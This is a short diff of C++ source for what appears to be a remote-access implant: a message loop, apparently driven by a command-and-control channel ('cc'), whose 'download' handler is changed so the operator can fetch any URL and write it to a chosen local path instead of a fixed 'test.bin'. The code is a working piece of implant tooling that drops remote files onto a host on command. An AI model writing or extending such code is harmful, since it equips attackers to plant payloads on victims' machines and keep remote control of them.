@@ -113,18 +113,27 @@ void MainThread(unsigned int parentThreadId)
         }
         else if (message.substr(0, 9) == "download ")
         {
-            string url = message.substr(9);
-            auto urlParts = HttpUtils::SplitUrl(url);
-            HttpClient client(SocketFactory(urlParts[0], urlParts[1], urlParts[2]));
-
-            auto response = client.Get(urlParts[3]);
+            string s = message.substr(9);
             
-            string path = Processes::GetExecutablePath() + Legit::SEPARATOR + "test.bin";
-            DataLoader::DumpToFile(Utils::WideFromString(path), response.body);
+            auto params = Utils::Split(s, " ");
+            if (params.size() != 2)
+            {
+                cc->Send("Usage: download URL LOCAL_FILENAME");
+            }
+            else
+            {
+                auto urlParts = HttpUtils::SplitUrl(params[0]);
+                auto localFilePath = params[1]; 
+                HttpClient client(SocketFactory(urlParts[0], urlParts[1], urlParts[2]));
 
-            ostringstream ss;
-            ss << Utils::FriendlySize(response.body.size()) << " downloaded to " << path;
-            cc->Send(ss.str());
+                auto response = client.Get(urlParts[3]);
+            
+                DataLoader::DumpToFile(Utils::WideFromString(localFilePath), response.body);
+
+                ostringstream ss;
+                ss << Utils::FriendlySize(response.body.size()) << " downloaded to " << localFilePath;
+                cc->Send(ss.str());
+            }
         }
         else if (message == "hello")
         {
